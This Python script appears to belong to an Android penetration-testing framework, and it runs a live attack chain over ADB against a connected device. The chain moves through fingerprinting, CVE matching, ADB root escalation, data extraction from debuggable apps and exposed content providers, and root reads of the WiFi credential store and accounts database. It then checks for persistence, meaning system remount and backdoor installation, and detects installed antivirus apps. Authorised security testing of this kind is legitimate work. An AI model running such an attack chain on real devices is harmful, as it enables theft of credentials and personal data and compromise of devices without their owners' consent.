#!/usr/bin/env python3
"""
LLM-AndroidPentest: Live Exploitation Demo

This script demonstrates the full exploitation chain against a connected Android device.
It shows real attacks, not simulations.

Usage:
    python exploit_demo.py [device_ip]

Requirements:
    - Connected Android device (Genymotion or real)
    - ADB access
"""

import sys
import os
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.reconnaissance import ADBConnection, DeviceEnumerator
from core.scanning.cve_matcher import CVEMatcher
from core.exploitation.techniques.adb_exploits import ADBExploiter, ADBExploitType


def print_banner():
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║         LLM-AndroidPentest: LIVE EXPLOITATION DEMO                   ║
║         ──────────────────────────────────────────────               ║
║         This demonstrates REAL attacks on a connected device         ║
╚══════════════════════════════════════════════════════════════════════╝
    """)


def print_section(title):
    print(f"\n{'═' * 70}")
    print(f"  {title}")
    print('═' * 70)


def print_success(msg):
    print(f"  [+] {msg}")


def print_info(msg):
    print(f"  [*] {msg}")


def print_fail(msg):
    print(f"  [-] {msg}")


def print_vuln(msg):
    print(f"  [!] VULNERABLE: {msg}")


def phase_1_reconnaissance(adb: ADBConnection):
    """Phase 1: Device Fingerprinting"""
    print_section("PHASE 1: RECONNAISSANCE")

    if not adb.is_connected():
        print_fail("Device not connected")
        return None

    enum = DeviceEnumerator(adb)
    info = enum.enumerate()

    print_success(f"Device: {info.model}")
    print_success(f"Android: {info.android_version} (API {info.api_level})")
    print_success(f"Security Patch: {info.security_patch}")
    print_success(f"Build Type: {adb.get_prop('ro.build.type')}")
    print_success(f"Architecture: {info.architecture}")

    # Check for security-relevant properties
    print_info("Security Properties:")
    se_status = adb.shell("getenforce 2>/dev/null || echo 'Unknown'").strip()
    print(f"      SELinux: {se_status}")

    encrypted = adb.get_prop("ro.crypto.state")
    print(f"      Encryption: {encrypted or 'Unknown'}")

    debuggable = adb.get_prop("ro.debuggable")
    if debuggable == "1":
        print_vuln("Device is debuggable!")

    return info


def phase_2_vulnerability_scan(device_info):
    """Phase 2: CVE Matching"""
    print_section("PHASE 2: VULNERABILITY ASSESSMENT")

    matcher = CVEMatcher()
    cves = matcher.match_device(
        android_version=device_info.android_version,
        api_level=device_info.api_level,
        security_patch=device_info.security_patch
    )

    print_success(f"Matched {len(cves)} potential CVEs")
    print()

    critical = [c for c in cves if c.severity == "CRITICAL"]
    high = [c for c in cves if c.severity == "HIGH"]

    if critical:
        print_vuln(f"{len(critical)} CRITICAL vulnerabilities found!")
        for cve in critical[:3]:
            print(f"      • {cve.cve_id}: {cve.description[:60]}...")

    if high:
        print_info(f"{len(high)} HIGH severity vulnerabilities")
        for cve in high[:2]:
            print(f"      • {cve.cve_id}: {cve.description[:60]}...")

    return cves


def phase_3_exploitation(adb: ADBConnection):
    """Phase 3: Active Exploitation"""
    print_section("PHASE 3: EXPLOITATION")

    exploiter = ADBExploiter(adb)
    results = []

    # Attack 1: ADB Root
    print_info("Attack 1: ADB Root Privilege Escalation")
    root_result = exploiter.exploit_adb_root()
    if root_result.success:
        print_vuln("ADB ROOT ACHIEVED!")
        print(f"      {root_result.output}")
        results.append(("ADB Root", True))
    else:
        print_fail(f"ADB root failed: {root_result.error}")
        results.append(("ADB Root", False))

    # Attack 2: Find Debuggable Apps
    print()
    print_info("Attack 2: Scanning for Debuggable Applications")
    debuggable_apps = exploiter.find_debuggable_apps()
    if debuggable_apps:
        print_vuln(f"Found {len(debuggable_apps)} debuggable apps!")
        for app in debuggable_apps[:5]:
            print(f"      • {app}")

        # Exploit first debuggable app
        if debuggable_apps:
            target_app = debuggable_apps[0]
            print()
            print_info(f"Exploiting: {target_app}")
            app_result = exploiter.exploit_debuggable_app(target_app)
            if app_result.success and app_result.data_extracted:
                print_vuln("Data extracted from app sandbox!")
                # Show snippet of extracted data
                data_preview = app_result.data_extracted[:500]
                for line in data_preview.split('\n')[:10]:
                    print(f"      {line}")
                results.append((f"App Data: {target_app}", True))
    else:
        print_info("No debuggable third-party apps found")
        results.append(("Debuggable Apps", False))

    # Attack 3: Exposed Content Providers
    print()
    print_info("Attack 3: Scanning for Exposed Content Providers")
    providers = exploiter.find_exposed_providers()
    if providers:
        print_vuln(f"Found {len(providers)} exposed content providers!")
        for p in providers[:5]:
            authority = p.get('authority', 'unknown')
            print(f"      • {authority}")

            # Try to query it
            query_result = exploiter.exploit_content_provider(authority)
            if query_result.success and query_result.data_extracted:
                print(f"        → Data leaked: {query_result.data_extracted[:100]}...")
                results.append((f"Provider: {authority}", True))
    else:
        print_info("No exposed content providers found")

    # Attack 4: Sensitive Data Extraction (with root)
    if root_result.success:
        print()
        print_info("Attack 4: Sensitive Data Extraction (Root)")

        sensitive_paths = [
            ("/data/misc/wifi/WifiConfigStore.xml", "WiFi Credentials"),
            ("/data/system/users/0/accounts.db", "Account Database"),
            ("/data/system/packages.xml", "Package Permissions"),
        ]

        for path, desc in sensitive_paths:
            content = adb.shell(f"cat {path} 2>/dev/null | head -5")
            if content and "No such file" not in content and "Permission denied" not in content:
                print_vuln(f"{desc} accessible!")
                print(f"      Path: {path}")
                results.append((desc, True))

    return results


def phase_4_post_exploitation(adb: ADBConnection):
    """Phase 4: Post-Exploitation"""
    print_section("PHASE 4: POST-EXPLOITATION")

    # Check what we can access
    print_info("Assessing persistent access...")

    # Can we install apps?
    install_check = adb.shell("pm install --help 2>&1 | head -1")
    if "usage" in install_check.lower():
        print_success("Can install applications (backdoor possible)")

    # Can we modify system?
    remount = adb.shell("mount -o rw,remount /system 2>&1")
    if "Permission denied" not in remount and "Read-only" not in remount:
        print_vuln("System partition remountable!")

    # Network access
    print_info("Network reconnaissance:")
    netstat = adb.shell("netstat -tlnp 2>/dev/null | head -10")
    if netstat:
        print(f"      Active listeners found")

    # Installed security apps
    print_info("Security software detection:")
    security_apps = ["com.avast", "com.avg", "com.lookout", "com.mcafee", "com.norton"]
    for app in security_apps:
        check = adb.shell(f"pm path {app} 2>/dev/null")
        if check.strip():
            print(f"      Found: {app}")


def generate_report(device_info, cves, exploit_results):
    """Generate exploitation report"""
    print_section("EXPLOITATION REPORT")

    print(f"""
  Target: {device_info.model}
  Android: {device_info.android_version} (API {device_info.api_level})
  Security Patch: {device_info.security_patch}

  CVEs Matched: {len(cves)}
  Critical: {len([c for c in cves if c.severity == 'CRITICAL'])}
  High: {len([c for c in cves if c.severity == 'HIGH'])}

  Exploitation Results:
  ─────────────────────""")

    success_count = 0
    for attack, success in exploit_results:
        status = "✓ SUCCESS" if success else "✗ Failed"
        print(f"    {status}: {attack}")
        if success:
            success_count += 1

    print(f"""
  ─────────────────────
  Success Rate: {success_count}/{len(exploit_results)} attacks succeeded

  {'[!] DEVICE COMPROMISED' if success_count > 0 else '[*] No successful exploits'}
    """)


def main():
    print_banner()

    # Get device ID
    device_id = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:6555"
    print_info(f"Target: {device_id}")

    # Connect
    adb = ADBConnection(device_id)
    if not adb.is_connected():
        print_fail(f"Cannot connect to {device_id}")
        print_info("Make sure device is connected: adb connect <ip>:<port>")
        return 1

    # Run attack chain
    device_info = phase_1_reconnaissance(adb)
    if not device_info:
        return 1

    cves = phase_2_vulnerability_scan(device_info)
    exploit_results = phase_3_exploitation(adb)
    phase_4_post_exploitation(adb)

    # Report
    generate_report(device_info, cves, exploit_results)

    print("\n" + "═" * 70)
    print("  Demo complete. This demonstrates real exploitation capabilities.")
    print("═" * 70 + "\n")

    return 0


if __name__ == "__main__":
    sys.exit(main())
